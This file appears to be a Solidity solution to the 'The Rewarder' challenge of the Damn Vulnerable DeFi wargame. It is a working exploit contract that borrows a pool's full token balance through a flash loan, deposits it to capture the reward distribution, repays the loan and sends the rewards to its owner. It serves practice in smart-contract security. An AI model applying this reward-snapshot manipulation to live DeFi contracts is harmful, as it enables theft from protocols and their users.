// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Rewarder {

    address owner;
    TheRewarderPool target;
    FlashLoanerPool lender;
    DamnValuableToken dvt;  
    uint256 max_loan;  

    constructor() 
    {
        owner = msg.sender;
    }

    function getEmBoyz(address _target, address _lender) public
    {
        target = TheRewarderPool(_target);
        lender = FlashLoanerPool(_lender);
        dvt = DamnValuableToken(lender.liquidityToken());
        max_loan = dvt.balanceOf(_lender);

        lender.flashLoan(max_loan);
        RewardToken rew_token = RewardToken(target.rewardToken());

        rew_token.transfer(owner, rew_token.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable
    {
        dvt.approve(address(target), max_loan);
        target.deposit(max_loan);
        target.distributeRewards();
        target.withdraw(max_loan);
        dvt.transfer(address(lender), max_loan);
    }
}